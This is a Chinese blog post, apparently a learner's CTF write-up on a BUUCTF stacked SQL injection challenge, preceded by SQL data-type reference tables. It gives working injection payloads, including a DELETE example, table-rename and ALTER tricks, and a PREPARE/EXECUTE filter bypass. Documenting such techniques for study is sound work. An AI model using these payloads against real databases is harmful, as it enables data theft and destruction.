<td align="left">保存可变长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的最大长度。最多 255 个字符。<strong>注释：</strong>如果值的长度大于 255，则被转换为 TEXT 类型。</td>
</tr>
<tr>
<td align="left">TINYTEXT</td>
<td align="left">存放最大长度为 255 个字符的字符串。</td>
</tr>
<tr>
<td align="left">TEXT</td>
<td align="left">存放最大长度为 65,535 个字符的字符串。</td>
</tr>
<tr>
<td align="left">BLOB</td>
<td align="left">用于 BLOBs（Binary Large OBjects）。存放最多 65,535 字节的数据。</td>
</tr>
<tr>
<td align="left">MEDIUMTEXT</td>
<td align="left">存放最大长度为 16,777,215 个字符的字符串。</td>
</tr>
<tr>
<td align="left">MEDIUMBLOB</td>
<td align="left">用于 BLOBs（Binary Large OBjects）。存放最多 16,777,215 字节的数据。</td>
</tr>
<tr>
<td align="left">LONGTEXT</td>
<td align="left">存放最大长度为 4,294,967,295 个字符的字符串。</td>
</tr>
<tr>
<td align="left">LONGBLOB</td>
<td align="left">用于 BLOBs (Binary Large OBjects)。存放最多 4,294,967,295 字节的数据。</td>
</tr>
<tr>
<td align="left">ENUM(x,y,z,etc.)</td>
<td align="left">允许您输入可能值的列表。可以在 ENUM 列表中列出最大 65535 个值。如果列表中不存在插入的值，则插入空值。<strong>注释：</strong>这些值是按照您输入的顺序排序的。可以按照此格式输入可能的值： ENUM(‘X’,’Y’,’Z’)</td>
</tr>
<tr>
<td align="left">SET</td>
<td align="left">与 ENUM 类似，不同的是，SET 最多只能包含 64 个列表项且 SET 可存储一个以上的选择。</td>
</tr>
</tbody></table>
<p><strong>Number 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">TINYINT(size)</td>
<td align="left">带符号-128到127 ，无符号0到255。</td>
</tr>
<tr>
<td align="left">SMALLINT(size)</td>
<td align="left">带符号范围-32768到32767，无符号0到65535, size 默认为 6。</td>
</tr>
<tr>
<td align="left">MEDIUMINT(size)</td>
<td align="left">带符号范围-8388608到8388607，无符号的范围是0到16777215。 size 默认为9</td>
</tr>
<tr>
<td align="left">INT(size)</td>
<td align="left">带符号范围-2147483648到2147483647，无符号的范围是0到4294967295。 size 默认为 11</td>
</tr>
<tr>
<td align="left">BIGINT(size)</td>
<td align="left">带符号的范围是-9223372036854775808到9223372036854775807，无符号的范围是0到18446744073709551615。size 默认为 20</td>
</tr>
<tr>
<td align="left">FLOAT(size,d)</td>
<td align="left">带有浮动小数点的小数字。在 size 参数中规定显示最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
<tr>
<td align="left">DOUBLE(size,d)</td>
<td align="left">带有浮动小数点的大数字。在 size 参数中规显示定最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
<tr>
<td align="left">DECIMAL(size,d)</td>
<td align="left">作为字符串存储的 DOUBLE 类型，允许固定的小数点。在 size 参数中规定显示最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>注意：</strong>以上的 size 代表的并不是存储在数据库中的具体的长度，如 int(4) 并不是只能存储4个长度的数字。</p>
<p>实际上int(size)所占多少存储空间并无任何关系。int(3)、int(4)、int(8) 在磁盘上都是占用 4 btyes 的存储空间。就是在显示给用户的方式有点不同外，int(M) 跟 int 数据类型是相同的。</p>
<p>例如：</p>
<p>1、int的值为10 （指定zerofill）</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; int（<span class="number">9</span>）显示结果为<span class="number">000000010</span></span><br><span class="line">&gt; int（<span class="number">3</span>）显示结果为<span class="number">010</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>就是显示的长度不一样而已 都是占用四个字节的空间</p>
</blockquote>
<p><strong>Date 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">DATE()</td>
<td align="left">日期。格式：YYYY-MM-DD<strong>注释：</strong>支持的范围是从 ‘1000-01-01’ 到 ‘9999-12-31’</td>
</tr>
<tr>
<td align="left">DATETIME()</td>
<td align="left"><em>日期和时间的组合。格式：YYYY-MM-DD HH:MM:SS*</em>注释：**支持的范围是从 ‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td>
</tr>
<tr>
<td align="left">TIMESTAMP()</td>
<td align="left"><em>时间戳。TIMESTAMP 值使用 Unix 纪元(‘1970-01-01 00:00:00’ UTC) 至今的秒数来存储。格式：YYYY-MM-DD HH:MM:SS*</em>注释：**支持的范围是从 ‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-09 03:14:07’ UTC</td>
</tr>
<tr>
<td align="left">TIME()</td>
<td align="left">时间。格式：HH:MM:SS<strong>注释：</strong>支持的范围是从 ‘-838:59:59’ 到 ‘838:59:59’</td>
</tr>
<tr>
<td align="left">YEAR()</td>
<td align="left">2 位或 4 位格式的年。<strong>注释：</strong>4 位格式所允许的值：1901 到 2155。2 位格式所允许的值：70 到 69，表示从 1970 到 2069。</td>
</tr>
</tbody></table>
<p>即便 DATETIME 和 TIMESTAMP 返回相同的格式，它们的工作方式很不同。在 INSERT 或 UPDATE 查询中，TIMESTAMP 自动把自身设置为当前的日期和时间。TIMESTAMP 也接受不同的格式，比如 YYYYMMDDHHMMSS、YYMMDDHHMMSS、YYYYMMDD 或 YYMMDD。</p>
<hr>
<h4 id="SQL-Server-数据类型"><a href="#SQL-Server-数据类型" class="headerlink" title="SQL Server 数据类型"></a>SQL Server 数据类型</h4><p><strong>String 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
<th align="left">存储</th>
</tr>
</thead>
<tbody><tr>
<td align="left">char(n)</td>
<td align="left">固定长度的字符串。最多 8,000 个字符。</td>
<td align="left">Defined width</td>
</tr>
<tr>
<td align="left">varchar(n)</td>
<td align="left">可变长度的字符串。最多 8,000 个字符。</td>
<td align="left">2 bytes + number of chars</td>
</tr>
<tr>
<td align="left">varchar(max)</td>
<td align="left">可变长度的字符串。最多 1,073,741,824 个字符。</td>
<td align="left">2 bytes + number of chars</td>
</tr>
<tr>
<td align="left">text</td>
<td align="left">可变长度的字符串。最多 2GB 文本数据。</td>
<td align="left">4 bytes + number of chars</td>
</tr>
<tr>
<td align="left">nchar</td>
<td align="left">固定长度的 Unicode 字符串。最多 4,000 个字符。</td>
<td align="left">Defined width x 2</td>
</tr>
<tr>
<td align="left">nvarchar</td>
<td align="left">可变长度的 Unicode 字符串。最多 4,000 个字符。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">nvarchar(max)</td>
<td align="left">可变长度的 Unicode 字符串。最多 536,870,912 个字符。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">ntext</td>
<td align="left">可变长度的 Unicode 字符串。最多 2GB 文本数据。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">bit</td>
<td align="left">允许 0、1 或 NULL</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">binary(n)</td>
<td align="left">固定长度的二进制字符串。最多 8,000 字节。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">varbinary</td>
<td align="left">可变长度的二进制字符串。最多 8,000 字节。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">varbinary(max)</td>
<td align="left">可变长度的二进制字符串。最多 2GB。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">image</td>
<td align="left">可变长度的二进制字符串。最多 2GB。</td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>Number 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
<th align="left">存储</th>
</tr>
</thead>
<tbody><tr>
<td align="left">tinyint</td>
<td align="left">允许从 0 到 255 的所有数字。</td>
<td align="left">1 字节</td>
</tr>
<tr>
<td align="left">smallint</td>
<td align="left">允许介于 -32,768 与 32,767 的所有数字。</td>
<td align="left">2 字节</td>
</tr>
<tr>
<td align="left">int</td>
<td align="left">允许介于 -2,147,483,648 与 2,147,483,647 的所有数字。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">bigint</td>
<td align="left">允许介于 -9,223,372,036,854,775,808 与 9,223,372,036,854,775,807 之间的所有数字。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">decimal(p,s)</td>
<td align="left">固定精度和比例的数字。允许从 -10^38 +1 到 10^38 -1 之间的数字。p 参数指示可以存储的最大位数（小数点左侧和右侧）。p 必须是 1 到 38 之间的值。默认是 18。s 参数指示小数点右侧存储的最大位数。s 必须是 0 到 p 之间的值。默认是 0。</td>
<td align="left">5-17 字节</td>
</tr>
<tr>
<td align="left">numeric(p,s)</td>
<td align="left">固定精度和比例的数字。允许从 -10^38 +1 到 10^38 -1 之间的数字。p 参数指示可以存储的最大位数（小数点左侧和右侧）。p 必须是 1 到 38 之间的值。默认是 18。s 参数指示小数点右侧存储的最大位数。s 必须是 0 到 p 之间的值。默认是 0。</td>
<td align="left">5-17 字节</td>
</tr>
<tr>
<td align="left">smallmoney</td>
<td align="left">介于 -214,748.3648 与 214,748.3647 之间的货币数据。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">money</td>
<td align="left">介于 -922,337,203,685,477.5808 与 922,337,203,685,477.5807 之间的货币数据。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">float(n)</td>
<td align="left">从 -1.79E + 308 到 1.79E + 308 的浮动精度数字数据。n 参数指示该字段保存 4 字节还是 8 字节。float(24) 保存 4 字节，而 float(53) 保存 8 字节。n 的默认值是 53。</td>
<td align="left">4 或 8 字节</td>
</tr>
<tr>
<td align="left">real</td>
<td align="left">从 -3.40E + 38 到 3.40E + 38 的浮动精度数字数据。</td>
<td align="left">4 字节</td>
</tr>
</tbody></table>
<p><strong>Date 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
<th align="left">存储</th>
</tr>
</thead>
<tbody><tr>
<td align="left">datetime</td>
<td align="left">从 1753 年 1 月 1 日 到 9999 年 12 月 31 日，精度为 3.33 毫秒。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">datetime2</td>
<td align="left">从 1753 年 1 月 1 日 到 9999 年 12 月 31 日，精度为 100 纳秒。</td>
<td align="left">6-8 字节</td>
</tr>
<tr>
<td align="left">smalldatetime</td>
<td align="left">从 1900 年 1 月 1 日 到 2079 年 6 月 6 日，精度为 1 分钟。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">date</td>
<td align="left">仅存储日期。从 0001 年 1 月 1 日 到 9999 年 12 月 31 日。</td>
<td align="left">3 bytes</td>
</tr>
<tr>
<td align="left">time</td>
<td align="left">仅存储时间。精度为 100 纳秒。</td>
<td align="left">3-5 字节</td>
</tr>
<tr>
<td align="left">datetimeoffset</td>
<td align="left">与 datetime2 相同，外加时区偏移。</td>
<td align="left">8-10 字节</td>
</tr>
<tr>
<td align="left">timestamp</td>
<td align="left">存储唯一的数字，每当创建或修改某行时，该数字会更新。timestamp 值基于内部时钟，不对应真实时间。每个表只能有一个 timestamp 变量。</td>
<td align="left"></td>
</tr>
</tbody></table>
<h4 id="其他数据类型："><a href="#其他数据类型：" class="headerlink" title="其他数据类型："></a><strong>其他数据类型：</strong></h4><table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">sql_variant</td>
<td align="left">存储最多 8,000 字节不同数据类型的数据，除了 text、ntext 以及 timestamp。</td>
</tr>
<tr>
<td align="left">uniqueidentifier</td>
<td align="left">存储全局唯一标识符 (GUID)。</td>
</tr>
<tr>
<td align="left">xml</td>
<td align="left">存储 XML 格式化数据。最多 2GB。</td>
</tr>
<tr>
<td align="left">cursor</td>
<td align="left">存储对用于数据库操作的指针的引用。</td>
</tr>
<tr>
<td align="left">table</td>
<td align="left">存储结果集，供稍后处理。</td>
</tr>
</tbody></table>
<p>接下来还有一手SQL函数，明儿再看，先整堆叠注入。。。。（SQL没基础，所以先学学）</p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>Stacked injection–堆叠注入–堆查询注入</p>
<p>原文地址;<a href="http://www.sqlinjection.net/stacked-queries/" target="_blank" rel="noopener">http://www.sqlinjection.net/stacked-queries/</a>   本篇属于集合原作者的思路和个人想法结合的一篇产物。Stacked injection 汉语翻译过来后，国内有的称为堆查询注入，也有称之为堆叠注入。个人认为称之为堆叠注入更为准确。堆叠注入为攻击者提供了很多的攻击手段，通过添加一个新 的查询或者终止查询，可以达到修改数据和调用存储过程的目的。这种技术在SQL注入中还是比较频繁的。</p>
<h2 id="0x01-原理介绍"><a href="#0x01-原理介绍" class="headerlink" title="0x01 原理介绍"></a>0x01 原理介绍</h2><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<p>（咦，那感觉，挺简单的？）</p>
<h2 id="0x02-堆叠注入的局限性"><a href="#0x02-堆叠注入的局限性" class="headerlink" title="0x02 堆叠注入的局限性"></a>0x02 堆叠注入的局限性</h2><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<p><img src="/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/2.jpg" alt="img"></p>
<p>Ps：此图是从原文中截取过来的，因为我个人的测试环境是php+mysql，是可以执行的，此处对于mysql/php存在质疑。但个人估计原文作者可能与我的版本的不同的原因。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。</p>
<p>在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
<h2 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h2><p>那么回到原题，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">然后随便试了试发现过滤</span><br><span class="line"></span><br><span class="line">​</span><br></pre></td></tr></table></figure>

<p><a href="http://web16.buuoj.cn/?inject=1where" target="_blank" rel="noopener">http://web16.buuoj.cn/?inject=1where</a><br>​<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​</span><br></pre></td></tr></table></figure></p>
<p>return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);<br>​<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后师傅们很牛逼的就知道他是堆叠注入了（学）</span><br></pre></td></tr></table></figure></p>
<p>师傅们之所以知道是堆叠注入，应该是发现show函数没被过滤并且union被过滤了叭，所以莫得联合注入，就去堆叠注入了。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?inject=222';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment">#			//表示这一句没啥作用，因为这一题flag就在默认库里头</span></span><br><span class="line">/?inject=222';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br><span class="line">/?inject=222';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>这些也都是简单地show语句查询，去了解一下show语句（为啥flag不能直接show）</p>
<h3 id="MySQL中show语法"><a href="#MySQL中show语法" class="headerlink" title="MySQL中show语法"></a>MySQL中show语法</h3><ol>
<li>show tables或show tables from database_name; – 显示当前数据库中所有表的名称。 </li>
<li>show databases; – 显示mysql中所有数据库的名称。 </li>
<li>show columns from table_name from database_name; 或show columns from database_name.table_name; – 显示表中列名称。 </li>
<li>show grants for user_name; – 显示一个用户的权限，显示结果类似于grant 命令。 </li>
<li>show index from table_name; – 显示表的索引。 </li>
<li>show status; – 显示一些系统特定资源的信息，例如，正在运行的线程数量。 </li>
<li>show variables; – 显示系统变量的名称和值。 </li>
<li>show processlist; – 显示系统中正在运行的所有进程，也就是当前正在执行的查询。大多数用户可以查看他们自己的进程，但是如果他们拥有process权限，就可以查看所有人的进程，包括密码。 </li>
<li>show table status; – 显示当前使用或者指定的database中的每个表的信息。信息包括表类型和表的最新更新时间。 </li>
<li>show privileges; – 显示服务器所支持的不同权限。 </li>
<li>show create database database_name; – 显示create database 语句是否能够创建指定的数据库。 </li>
<li>show create table table_name; – 显示create database 语句是否能够创建指定的数据库。 </li>
<li>show engines; – 显示安装以后可用的存储引擎和默认引擎。 </li>
<li>show innodb status; – 显示innoDB存储引擎的状态。 </li>
<li>show logs; – 显示BDB存储引擎的日志。 </li>
<li>show warnings; – 显示最后一个执行的语句所产生的错误、警告和通知。 </li>
<li>show errors; – 只显示最后一个执行语句所产生的错误。 </li>
<li>show [storage] engines; –显示安装后的可用存储引擎和默认引擎。</li>
</ol>
<p>除了status,processlist和grants外，其它的都可以带有like wild选项，它可以使用SQL的’%’和’_’字符；</p>
<p>show databases like ‘%t’;</p>
<p>将会列出所有数据库名字末尾为’t’字符的数据库</p>
<p>当然了，在这些sql中，你也可以用db_name.table_name来代替 table_name from db_name这样写会更简便些!</p>
<p>如果一个用户没有一个表的任何权限，表将不在SHOW TABLES或mysqlshow db_name中的输出中显示</p>
<p>大家可能还记得describe table_name ，它实现的是与show columns from db_name.table_name一样的效果</p>
<p>show status将可以用mysqlshow –status 来得到同样的效果</p>
<ul>
<li>列 含义</li>
<li>name 表名</li>
<li>Type 表的类型 (ISAM，MyISAM或HEAP)</li>
<li>Row_format 行存储格式 (固定, 动态, 或压缩）</li>
<li>Rows 行数量</li>
<li>Avg_row_length 平均行长度</li>
<li>Data_length 数据文件的长度</li>
<li>Max_data_length 数据文件的最大长度</li>
<li>Index_length 索引文件的长度</li>
<li>Data_free 已分配但未使用了字节数</li>
<li>Auto_increment 下一个 autoincrement(自动加1）值</li>
<li>Create_time 表被创造的时间</li>
<li>Update_time 数据文件最后更新的时间</li>
<li>Check_time 最后对表运行一个检查的时间</li>
<li>Create_options 与CREATE TABLE一起使用的额外选项</li>
<li>Comment 当创造表时，使用的注释 (或为什么MySQL不能存取表信息的一些信息)。</li>
</ul>
<p>SHOW FIELDS是SHOW COLUMNS一个同义词，SHOW KEYS是SHOW INDEX一个同义词。你也可以用mysqlshow db_name tbl_name或mysqlshow -k db_name tbl_name 列出一张表的列或索引。</p>
<p>SHOW INDEX以非常相似于ODBC的SQLStatistics调用的格式返回索引信息。下面的列被返回：</p>
<p>列 含义</p>
<p>Table   表名</p>
<p>Non_unique  0，如果索引不能包含重复。</p>
<p>Key_name    索引名</p>
<p>Seq_in_index    索引中的列顺序号, 从 1 开始。</p>
<p>Column_name 列名。</p>
<p>Collation   列怎样在索引中被排序。在MySQL中，这可以有值A（升序) 或NULL（不排序)。</p>
<p>Cardinality 索引中唯一值的数量。这可通过运行isamchk -a更改.</p>
<p>Sub_part    如果列只是部分被索引，索引字符的数量。NULL，如果整个键被索引。</p>
<p>嗯，熟悉的语句不多，show似乎也确实看不了字段内容。（怪不得师傅们都用了别的方法）</p>
<h4 id="method1"><a href="#method1" class="headerlink" title="method1"></a>method1</h4><ol>
<li>改数据库：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1';<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">TO</span> <span class="string">`words1`</span>;<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">TO</span> <span class="string">`words`</span>;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">CHANGE</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>（由于是只回显前面的，所以最后一个语句似乎不用写，然后id=1意味着原来的flag=1，所以无回显，需要注入1’ or ‘1’ =’1）</p>
<p>改数据库的语句：改表名大概就如师傅这么写吧，rename table ‘表名’ to ‘新表名‘；</p>
<p>看看改列名，</p>
<p>各个数据库不一样。<br>oracle: ALTER TABLE 表名 RENAME COLUMN 列名 TO 新列名</p>
<p>sqlserver:exec sp_rename ‘[表名].[列名]’,’[表名].[新列名]’</p>
<p><strong>mysql:ALTER TABLE 表名 CHANGE ’列名‘ ’新列名‘ 列类型</strong></p>
<p>DEFAULT CHARACTER SET utf8：数据库字符集。设置数据库的默认编码为utf8，utf8中间不要”-“；</p>
<p>COLLATE utf8_general_ci:数据库校对规则。ci是case insensitive的缩写，意思是大小写不敏感；相对的是cs，即case sensitive，大小写敏感；还有一种是utf8_bin，是将字符串中的每一个字符用二进制数据存储，区分大小写。</p>
<p>NOT NULL 非空呗</p>
<p>改列名加上就对了23333  </p>
<p>ALTER TABLE 表名 CHANGE ’列名‘  ’新列名‘  列类型 CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</p>
<h3 id="mysql预编译"><a href="#mysql预编译" class="headerlink" title="mysql预编译"></a>mysql预编译</h3><ol start="2">
<li>预编译（mysql）</li>
</ol>
<p>SQL代码</p>
<ol>
<li>prepare presql from ‘select a from table’;  </li>
</ol>
<p>上面这句SQL创建了一个<strong>预编译</strong>的SQL。名为presql，这个<strong>预编译</strong>SQL的存活期就是当前的会话，也就是当前的数据库连接。<br>如果连接一断开 ，那就会消失。</p>
<p>from后面跟的就是要进行编译的那个SQL，这个值可以是一个字面的字符串值 ，就像上面；也可以是一个变量。<br>比如：</p>
<p>SQL代码</p>
<p>set @sql = ‘select * from admin’;</p>
<p>prepare presql from @sql; </p>
<p>from后面跟的只能是字面值或者变量这两种情况 ，不能直接跟十六进制的字符串。</p>
<p>比如：</p>
<p>SQL代码</p>
<ol>
<li>prepare testhex from 0x73656C656374202A2066726F6D2061;  </li>
</ol>
<p>这样是错误 的，可以先用变量来接收这个十六进制串的值，然后再进行SQL的编译。</p>
<p>SQL代码</p>
<ol>
<li>set @sql = 0x73656C656374202A2066726F6D2061;prepare testhex from @sql;  </li>
</ol>
<p>注意：被编译的SQL只能是一条单独的语句，不能多条语句一起编译，比如：</p>
<p>SQL代码</p>
<ol>
<li>prepare mutisql from ‘select 1;select 2’;  </li>
</ol>
<p>这是错误的。</p>
<p>可以被<strong>预编译</strong>的SQL语句的类型也是有限制的，并不是所有的SQL都可以被编译。<br>下面这些类型的SQL是可以编译的：<br>create table,delete,do,insert,replace,select,set,update 和多数的show语句。</p>
<p>（这题用了select）</p>
<p>带参数的<strong>预编译</strong>SQL：</p>
<p>SQL代码</p>
<p>1.1 prepare pstmt from ‘select a from table where id = ?’;  </p>
<p>参数用?代替。注意，就算参数的值是一个字符串，也不用加引号。加了反而有错。</p>
<p>在调用的时候利用using关键字向SQL传递参数 。</p>
<p>SQL代码</p>
<p>1.2 set @value = 1;execute pstmt using @value;  </p>
<p>先声明一个变量来保存参数的值，然后通过后面的using @value来传SQL传递参数 。<br>注意这里的参数的值只能由变量来传递，不能直接写成execute pstmt using 1;<br>这是错误的。</p>
<p>多个参数之间用逗号隔开。</p>
<p>删除<strong>预编译</strong>SQL的办法：</p>
<p>SQL代码</p>
<p>deallocate|drop prepare pstmt;   </p>
<h4 id="method2"><a href="#method2" class="headerlink" title="method2"></a>method2</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'sel'</span>,<span class="string">'ect * from `1919810931114514`'</span>);</span><br><span class="line"><span class="keyword">prepare</span> presql <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> presql;				//执行语句<span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`1919810931114514`</span>  拿到flag</span><br><span class="line"><span class="keyword">deallocate</span> <span class="keyword">prepare</span> presql;</span><br></pre></td></tr></table></figure>

<p>附：</p>
<p>concat函数</p>
<p>concat(str1,str2,…)返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p>
<p>strstr()函数</p>
<p>strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符及字符串及剩余部分，否则返回 FALSE。</p>
<p>该函数是区分大小写的。如需进行不区分大小写的搜索，请使用 <a href="https://www.runoob.com/php/func-string-stristr.html" target="_blank" rel="noopener">stristr()</a> 函数。</p>
<p>语法</p>
<p>strstr(<em>string,search,before_search</em>)</p>
<table>
<thead>
<tr>
<th><em>string</em></th>
<th>必需。规定被搜索的字符串。</th>
</tr>
</thead>
<tbody><tr>
<td><em>search</em></td>
<td>必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</td>
</tr>
<tr>
<td><em>before_search</em></td>
<td>可选。一个默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</td>
</tr>
</tbody></table>
<p>这里检测了</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">strstr</span><span class="params">(<span class="variable">$inject</span>, <span class="string">"set"</span>)</span></span> &amp;&amp; strstr(<span class="variable">$inject</span>, <span class="string">"prepare"</span>)</span><br></pre></td></tr></table></figure>

<p>应该是返回ture了，所以蹦出来，所以大概就要绕过他（出来个这么个函数大概就这意思吧，不然也没别的操作了）</p>
<p>于是利用他的区分大小写加上sql语句的不区分大小写，就能绕过了。</p>
<h3 id="bb两句："><a href="#bb两句：" class="headerlink" title="bb两句："></a>bb两句：</h3><p>wdnmd，一天的任务变成两天完成了，SQL的函数都还没看，还是太菜了（基础太差，哭了）</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>method1：<a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p>
<p>method2：<a href="https://www.codercto.com/a/81951.html" target="_blank" rel="noopener">https://www.codercto.com/a/81951.html</a></p>
<p>sql：<a href="https://www.runoob.com/sql/sql-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/sql/sql-tutorial.html</a></p>
<p>堆叠注入：<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nth3way/articles/7128189.html</a></p>
<p>show:<a href="https://www.cnblogs.com/SQL888/p/5750161.html" target="_blank" rel="noopener">https://www.cnblogs.com/SQL888/p/5750161.html</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/note/" rel="tag"># note</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/07/22/nmap/" rel="next" title="nmap">
                <i class="fa fa-chevron-left"></i> nmap
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/07/30/高明的黑客_easy_tornado/" rel="prev" title="高明的黑客_easy_tornado">
                高明的黑客_easy_tornado <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="V">
            
              <p class="site-author-name" itemprop="name">V</p>
